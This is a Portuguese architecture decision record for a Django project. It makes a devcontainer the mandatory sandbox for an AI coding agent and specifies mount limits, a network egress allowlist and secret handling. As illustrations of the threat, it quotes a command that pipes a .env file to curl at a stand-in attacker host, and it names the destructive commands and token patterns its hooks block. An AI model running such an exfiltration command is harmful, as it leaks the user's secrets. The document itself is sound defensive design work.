---
adr: 0062
titulo: Devcontainer canônico — sandbox do host para execução do agente IA
status: aceito
data-decisao: 2026-05-23
decisor: roldao
contexto-marco: Onda 2 plano-v2 (saneamento pré-Marco 3 Fase 5)
relacionados:
  - docs/adr/0000-uso-de-ia.md
  - docs/adr/0001-stack.md
  - REGRAS-INEGOCIAVEIS.md
  - docs/faseamento-foundation-waves.md
---

# ADR-0062 — Devcontainer canônico

## Status

**ACEITO** em 2026-05-23. Formaliza a Decisão Fundadora **D4** (criação de devcontainer, tomada em 2026-05-16) que tinha arquivo `.devcontainer/devcontainer.json` no repositório mas **nunca fora documentada como ADR**. Drift detectado pelo auditor LLM da auditoria do plano-v1 ("D4 nunca materializada — premissa cega"); investigação real (Onda 0 do plano-v2) confirmou que o arquivo existe e está completo.

## Contexto

Auditor LLM da auditoria do plano-v1 apontou que:

1. O agente IA (Claude Code) roda **direto no host Windows 11** do Roldão, com acesso a:
   - `.env` (mesmo que sem segredo real hoje — verificado pelo scan manual em `docs/seguranca/gitleaks-historico-2026-05-23.md`)
   - `DJANGO_SECRET_KEY` dogfooding
   - Em F-C1 vai ter `KMS_KEY_ID` real
   - Quando A3 vier (Lacuna em Wave A), vai ter certificado e-CNPJ do Roldão
2. Hooks `block-destructive.sh` + `secrets-scanner.sh` defendem **comandos óbvios** (`rm -rf`, `git push --force`, padrões tipo `AKIA...`/`ghp_...`), **não defendem ataques sutis** como `cat .env | base64 | curl evil.com` ou exfiltração via DNS.
3. D4 (devcontainer) foi decidida em 2026-05-16 mas o arquivo existia "abandonado" — sem ADR formalizando obrigatoriedade de USAR o devcontainer.

Risco real: agente IA com permissão excessiva no host ≈ item 110 da checklist "os principais problemas código gerado por agentes de IA" (`Agente com permissões excessivas`).

## Decisão

**Devcontainer é o sandbox canônico de execução do agente IA. Claude Code DEVE rodar dentro do devcontainer; rodar direto no host fica permitido só na janela atual de transição.**

### Estado atual (.devcontainer/devcontainer.json)

Arquivo presente e funcional desde antes desta ADR. Configuração resumida:

| Item | Valor atual | Decisão |
|---|---|---|
| Imagem base | `mcr.microsoft.com/devcontainers/python:1-3.12-bookworm` | Manter; pinar SHA em F-C3 (SUPPLY-1) |
| Features | docker-in-docker, git, github-cli | Manter |
| Extensions VS Code | python, pylance, ruff, docker, markdown, yaml, django | Manter |
| `forwardPorts` | 8000 (Django), 5432 (Postgres) | Manter |
| `postCreateCommand` | `pip install --user poetry==1.8.3 && poetry install` | Manter |
| `remoteEnv` | `PYTHONUNBUFFERED=1`, `DJANGO_SETTINGS_MODULE=config.settings.dev` | Manter |

### Cláusulas obrigatórias adicionadas por esta ADR

#### INV-DEVCONT-001 — Devcontainer obrigatório para sessões críticas

A partir da aceitação desta ADR, **qualquer sessão de agente IA que toque pelo menos um dos seguintes paths** DEVE rodar dentro do devcontainer:

- `src/infrastructure/auth/**`
- `src/infrastructure/kms/**`
- `src/infrastructure/financeiro/**` (em Wave A: `fiscal/`, `contas-receber/`, `caixa-tecnico/`)
- `src/infrastructure/certificados/**` (em Marco 4)
- `migrations/**` (qualquer módulo)
- `.claude/hooks/**`
- `.github/workflows/**`
- `REGRAS-INEGOCIAVEIS.md`, `.specify/memory/constitution.md`
- Qualquer arquivo `.env*` (mesmo `.env.example`)

Sessões que só tocam doc (`docs/**`, `*.md` na raiz) podem seguir rodando no host até F-C2.

A partir da F-C1 (próxima Foundation), **todas** as sessões com edição de código rodam dentro do devcontainer.

#### INV-DEVCONT-002 — Filesystem isolado fora do projeto

Devcontainer **NÃO** monta o filesystem completo do host. Mounts permitidos:

- O próprio repositório (`workspaceFolder` — leitura+escrita)
- `~/.gitconfig` (read-only)
- Volume `node_modules-cache` (se aparecer Node em Wave A — read+write)
- `gh-cli-config` (config do GitHub CLI — read+write, mas sem token do host)

**Proibido** montar `$HOME` inteiro, `Documents/`, `Downloads/`, ou qualquer caminho fora do projeto. Mount fora dessa lista exige ADR de extensão.

#### INV-DEVCONT-003 — Network egress allowlist

A partir de F-C2, o devcontainer **deve** ter network egress restrito por allowlist:

- Anthropic API (`api.anthropic.com:443`)
- GitHub (`github.com:443`, `api.github.com:443`)
- PyPI mirror (`pypi.org:443`, `files.pythonhosted.org:443`)
- Backblaze B2 (`api.backblazeb2.com:443`, `*.backblazeb2.com:443`)
- AWS KMS (`kms.sa-east-1.amazonaws.com:443`, `kms.us-east-1.amazonaws.com:443`)
- DNS (UDP/TCP 53 para resolvers configurados)

Egress para outros destinos = log + bloqueio. Implementação via `iptables` no `postCreateCommand` ou via Docker Compose `networks` com policy custom.

**Decisão diferida:** ferramenta concreta (firejail, nsjail, iptables direto, Docker network policy) decidida no spec FORWARD da F-C2 quando observabilidade tiver visibilidade pra medir falsos positivos.

#### INV-DEVCONT-004 — Sem secret do host

Variáveis de ambiente sensíveis do **host** NÃO podem aparecer no `remoteEnv` nem em `containerEnv` do devcontainer. Acesso a segredo dentro do devcontainer obrigatoriamente via:

1. `.env` local do devcontainer (montado, nunca commitado — `.gitignore` cobre)
2. AWS KMS via IAM role do container (quando F-C1 entrar)
3. `gh auth login` dentro do container (token não vaza pro host)

## Consequências

### Positivas

- Reduz superfície de ataque do agente IA — `cat .env | curl evil.com` precisa primeiro escapar o sandbox, não mais "1 comando do shell".
- Reproduz ambiente entre Roldão e qualquer subagente/contratado humano futuro.
- Pin de versão Python 3.12 + Poetry 1.8.3 elimina "funciona na minha máquina".
- Materializa a Decisão Fundadora D4 (declarada, agora exigida).

### Negativas

- Roldão precisa rodar Docker Desktop + VS Code com extensão Dev Containers (ele já roda Docker Compose; extensão é setup adicional).
- Reload do agente IA dentro do devcontainer adiciona ~5s ao boot de cada sessão (custo aceitável vs proteção).
- Network allowlist (INV-DEVCONT-003) pode causar falsos positivos em deps com CDN não-listado — orçar pra F-C2.

### Aceitas conscientemente

- Roldão **pode** rodar Claude Code direto no host até F-C1 (janela de transição). A partir de F-C1, hook valida sessão e bloqueia edit em paths críticos fora do devcontainer.
- Atualização da imagem base (Python 3.12 → 3.13 quando sair) entra como ADR extensão, não como decisão livre do agente.

## GATEs Wave A

- **GATE-DEVCONT-1:** instalar hook `devcontainer-sessao-validator.sh` no F-C1 que detecta se sessão está dentro de container (variável `REMOTE_CONTAINERS=true` ou similar) e bloqueia edit em paths críticos quando fora.
- **GATE-DEVCONT-2:** decidir e aplicar ferramenta de network egress allowlist em F-C2 (firejail / nsjail / iptables / Docker network policy).
- **GATE-DEVCONT-3:** quando A3 entrar (Wave A), expor certificado e-CNPJ via volume isolado read-only montado só no devcontainer da sessão que precisa assinar.

## Não-objetivos desta ADR

- **NÃO** define ambiente CI (GitHub Actions roda em imagem própria — coberta por DEP-003 / SUPPLY-1 / F-C3).
- **NÃO** define ambiente de produção (deploy não existe ainda — memória `project_deploy_so_quando_roldao_quiser`).
- **NÃO** força contribuidor humano externo a usar devcontainer (sem contribuidor externo na janela atual — `feedback_resolver_nao_documentar`).

## Histórico

- 2026-05-16: D4 decidida (devcontainer + 4 outras decisões fundadoras).
- 2026-05-23: arquivo `.devcontainer/devcontainer.json` confirmado presente; auditor LLM apontou ausência de ADR como gap.
- 2026-05-23: ADR-0062 criada pela Onda 2 do plano-v2 (saneamento pré-Marco 3 Fase 5).
